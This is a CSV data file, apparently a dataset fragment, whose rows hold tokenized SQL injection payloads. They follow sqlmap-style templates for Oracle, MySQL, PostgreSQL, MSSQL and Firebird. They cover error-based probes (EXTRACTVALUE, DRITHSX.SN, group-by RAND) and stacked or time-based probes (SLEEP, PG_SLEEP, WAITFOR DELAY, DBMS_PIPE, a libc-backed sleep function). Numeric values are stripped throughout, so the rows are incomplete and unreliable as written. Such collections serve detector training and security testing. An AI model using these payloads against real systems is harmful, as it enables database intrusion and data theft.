,language,source
6965,sql," % ' AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ' % ' = ' "
6966,sql," % "" AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND " % " = " "
6967,sql,"  AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) )  -- "
6968,sql,"  AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) # "
6969,sql," ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' )  -- "
6970,sql," ' AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' )  -- "
6971,sql," ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( = "
6972,sql," ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( = "
6973,sql," ) ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( ( = "
6974,sql,"  AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) "
6975,sql," ' ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ' cbJM ' = ' "
6976,sql," ' ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( ' CCWJ ' = ' "
6977,sql," ' ) ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( ( ' eHJm ' = ' "
6978,sql," ' AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ' OpRG ' = ' "
6979,sql," ' ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ' tKyP ' LIKE ' "
6980,sql," ' ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( ' fdLS ' LIKE ' "
6981,sql," ' AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ' ISyL ' LIKE ' "
6982,sql," "" ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( " bvpd " = " "
6983,sql," "" ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( " zbWb " = " "
6984,sql," "" AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND " eBlz " = " "
6985,sql," "" ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( " joej " LIKE " "
6986,sql," "" AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND " OgbI " LIKE " "
6987,sql," % ' ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ' % ' = ' "
6988,sql," % ' ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( ' % ' = ' "
6989,sql," % ' AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ' % ' = ' "
6990,sql," % "" AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND " % " = " "
6991,sql,"  AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' )  -- "
6992,sql,"  AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) # "
6993,sql," ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , )  -- "
6994,sql," ' PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , )  -- "
6995,sql," ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( = "
6996,sql," ) ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ( = "
6997,sql," ) ) ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ( ( = "
6998,sql,"  PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) "
6999,sql," ' ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ' SDfl ' = ' "
7000,sql," ' ) ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ( ' feUU ' = ' "
7001,sql," ' ) ) ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ( ( ' dtvs ' = ' "
7002,sql," ' PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ' wFfM ' = ' "
7003,sql," ' ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ' FRGc ' LIKE ' "
7004,sql," ' ) ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ( ' PlxG ' LIKE ' "
7005,sql," ' PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ' ybJp ' LIKE ' "
7006,sql," "" ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( " yYgZ " = " "
7007,sql," "" ) ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ( " Hjnl " = " "
7008,sql," "" PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND " UOhd " = " "
7009,sql," "" ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( " pHUd " LIKE " "
7010,sql," "" PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND " IUBY " LIKE " "
7011,sql," % ' ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ' % ' = ' "
7012,sql," % ' ) ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ( ' % ' = ' "
7013,sql," % ' PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ' % ' = ' "
7014,sql," % "" PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND " % " = " "
7015,sql,"  PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , )  -- "
7016,sql,"  PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) # "
7017,sql," ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) "
7018,sql," ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) ) "
7019,sql," ( CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) ) "
7020,sql," ( CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) ) "
7021,sql," ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) "
7022,sql," ' , ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a )  -- "
7023,sql," , ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) "
7024,sql," ' , ( SELECT  FROM ( SELECT ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) ) s )  -- "
7025,sql," , ( SELECT  FROM ( SELECT ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) ) s ) "
7026,sql," ' , ( CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) )  -- "
7027,sql," , ( CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) ) "
7028,sql," ( SELECT CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) "
7029,sql," ( SELECT ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) "
7030,sql," ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) "
7031,sql," ( SELECT CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) FROM DUAL ) "
7032,sql,"SELECT ' qpvbq ' | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) | | ' qvkjq ' "
7033,sql,"SELECT ' qpvbq ' | | ( CASE  WHEN  THEN  ELSE  END ) | | ' qvkjq ' FROM RDB$"
7034,sql," ) ; SELECT SLEEP ( ) # "
7035,sql," ' ; SELECT SLEEP ( ) # "
7036,sql," ) ) ; SELECT SLEEP ( ) # "
7037,sql," ) ) ) ; SELECT SLEEP ( ) # "
7038,sql," ; SELECT SLEEP ( ) # "
7039,sql," ' ) ; SELECT SLEEP ( ) # "
7040,sql," ' ) ) ; SELECT SLEEP ( ) # "
7041,sql," ' ) ) ) ; SELECT SLEEP ( ) # "
7042,sql," "" ) ; SELECT SLEEP ( ) # "
7043,sql," "" ) ) ; SELECT SLEEP ( ) # "
7044,sql," "" ; SELECT SLEEP ( ) # "
7045,sql," % ' ) ; SELECT SLEEP ( ) # "
7046,sql," % ' ) ) ; SELECT SLEEP ( ) # "
7047,sql," % ' ; SELECT SLEEP ( ) # "
7048,sql," % "" ; SELECT SLEEP ( ) # "
7049,sql," ) ; SELECT SLEEP ( )  -- "
7050,sql," ' ; SELECT SLEEP ( )  -- "
7051,sql," ) ; SELECT SLEEP ( ) AND ( = "
7052,sql," ) ) ; SELECT SLEEP ( ) AND ( ( = "
7053,sql," ) ) ) ; SELECT SLEEP ( ) AND ( ( ( = "
7054,sql," ; SELECT SLEEP ( ) "
7055,sql," ' ) ; SELECT SLEEP ( ) AND ( ' lmSu ' = ' "
7056,sql," ' ) ) ; SELECT SLEEP ( ) AND ( ( ' PVbr ' = ' "
7057,sql," ' ) ) ) ; SELECT SLEEP ( ) AND ( ( ( ' nWyj ' = ' "
7058,sql," ' ; SELECT SLEEP ( ) AND ' Mgnw ' = ' "
7059,sql," ' ) ; SELECT SLEEP ( ) AND ( ' atZg ' LIKE ' "
7060,sql," ' ) ) ; SELECT SLEEP ( ) AND ( ( ' IBiJ ' LIKE ' "
7061,sql," ' ; SELECT SLEEP ( ) AND ' dHOM ' LIKE ' "
7062,sql," "" ) ; SELECT SLEEP ( ) AND ( " LmmD " = " "
7063,sql," "" ) ) ; SELECT SLEEP ( ) AND ( ( " QCSF " = " "
7064,sql," "" ; SELECT SLEEP ( ) AND " BcFR " = " "
7065,sql," "" ) ; SELECT SLEEP ( ) AND ( " DQOb " LIKE " "
7066,sql," "" ; SELECT SLEEP ( ) AND " MybI " LIKE " "
7067,sql," % ' ) ; SELECT SLEEP ( ) AND ( ' % ' = ' "
7068,sql," % ' ) ) ; SELECT SLEEP ( ) AND ( ( ' % ' = ' "
7069,sql," % ' ; SELECT SLEEP ( ) AND ' % ' = ' "
7070,sql," % "" ; SELECT SLEEP ( ) AND " % " = " "
7071,sql," ; SELECT SLEEP ( )  -- "
7072,sql," ; SELECT SLEEP ( ) # "
7073,sql," ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) tqiZ ) # "
7074,sql," ' ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) tqiZ ) # "
7075,sql," ) ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) tqiZ ) # "
7076,sql," ) ) ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) tqiZ ) # "
7077,sql," ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) tqiZ ) # "
7078,sql," ' ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) tqiZ ) # "
7079,sql," ' ) ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) tqiZ ) # "
7080,sql," ' ) ) ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) tqiZ ) # "
7081,sql," "" ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) tqiZ ) # "
7082,sql," "" ) ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) tqiZ ) # "
7083,sql," "" ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) tqiZ ) # "
7084,sql," % ' ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) tqiZ ) # "
7085,sql," % ' ) ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) tqiZ ) # "
7086,sql," % ' ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) tqiZ ) # "
7087,sql," % "" ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) tqiZ ) # "
7088,sql," ) ; SELECT PG_SLEEP ( )  --"
7089,sql," ' ; SELECT PG_SLEEP ( )  --"
7090,sql," ) ) ; SELECT PG_SLEEP ( )  --"
7091,sql," ) ) ) ; SELECT PG_SLEEP ( )  --"
7092,sql," ; SELECT PG_SLEEP ( )  --"
7093,sql," ' ) ; SELECT PG_SLEEP ( )  --"
7094,sql," ' ) ) ; SELECT PG_SLEEP ( )  --"
7095,sql," ' ) ) ) ; SELECT PG_SLEEP ( )  --"
7096,sql," "" ) ; SELECT PG_SLEEP ( )  --"
7097,sql," "" ) ) ; SELECT PG_SLEEP ( )  --"
7098,sql," "" ; SELECT PG_SLEEP ( )  --"
7099,sql," % ' ) ; SELECT PG_SLEEP ( )  --"
7100,sql," % ' ) ) ; SELECT PG_SLEEP ( )  --"
7101,sql," % ' ; SELECT PG_SLEEP ( )  --"
7102,sql," % "" ; SELECT PG_SLEEP ( )  --"
7103,sql," ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
7104,sql," ' ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
7105,sql," ) ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
7106,sql," ) ) ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
7107,sql," ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
7108,sql," ' ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
7109,sql," ' ) ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
7110,sql," ' ) ) ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
7111,sql," "" ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
7112,sql," "" ) ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
7113,sql," "" ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
7114,sql," % ' ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
7115,sql," % ' ) ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
7116,sql," % ' ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
7117,sql," % "" ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
7118,sql," ) ; WAITFOR DELAY ' : : '  --"
7119,sql," ' ; WAITFOR DELAY ' : : '  --"
7120,sql," ) ) ; WAITFOR DELAY ' : : '  --"
7121,sql," ) ) ) ; WAITFOR DELAY ' : : '  --"
7122,sql," ; WAITFOR DELAY ' : : '  --"
7123,sql," ' ) ; WAITFOR DELAY ' : : '  --"
7124,sql," ' ) ) ; WAITFOR DELAY ' : : '  --"
7125,sql," ' ) ) ) ; WAITFOR DELAY ' : : '  --"
7126,sql," "" ) ; WAITFOR DELAY ' : : '  --"
7127,sql," "" ) ) ; WAITFOR DELAY ' : : '  --"
7128,sql," "" ; WAITFOR DELAY ' : : '  --"
7129,sql," % ' ) ; WAITFOR DELAY ' : : '  --"
7130,sql," % ' ) ) ; WAITFOR DELAY ' : : '  --"
7131,sql," % ' ; WAITFOR DELAY ' : : '  --"
7132,sql," % "" ; WAITFOR DELAY ' : : '  --"
7133,sql," ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
7134,sql," ' ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
7135,sql," ) ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
7136,sql," ) ) ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
7137,sql," ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
7138,sql," ' ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
7139,sql," ' ) ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
7140,sql," ' ) ) ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
7141,sql," "" ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
7142,sql," "" ) ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
7143,sql," "" ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
7144,sql," % ' ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
7145,sql," % ' ) ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
7146,sql," % ' ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
7147,sql," % "" ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
7148,sql," ) AND SLEEP ( )  -- "
7149,sql," ' AND SLEEP ( )  -- "
7150,sql," ) AND SLEEP ( ) AND ( = "
7151,sql," ) ) AND SLEEP ( ) AND ( ( = "
7152,sql," ) ) ) AND SLEEP ( ) AND ( ( ( = "
7153,sql,"  AND SLEEP ( ) "
7154,sql," ' ) AND SLEEP ( ) AND ( ' lBWb ' = ' "
7155,sql," ' ) ) AND SLEEP ( ) AND ( ( ' zqqI ' = ' "
7156,sql," ' ) ) ) AND SLEEP ( ) AND ( ( ( ' MaNY ' = ' "
7157,sql," ' AND SLEEP ( ) AND ' zRob ' = ' "
7158,sql," ' ) AND SLEEP ( ) AND ( ' ORBt ' LIKE ' "
7159,sql," ' ) ) AND SLEEP ( ) AND ( ( ' CvFB ' LIKE ' "
7160,sql," ' AND SLEEP ( ) AND ' gsAz ' LIKE ' "
7161,sql," "" ) AND SLEEP ( ) AND ( " dOeS " = " "
7162,sql," "" ) ) AND SLEEP ( ) AND ( ( " lOjA " = " "
7163,sql," "" AND SLEEP ( ) AND " GCts " = " "
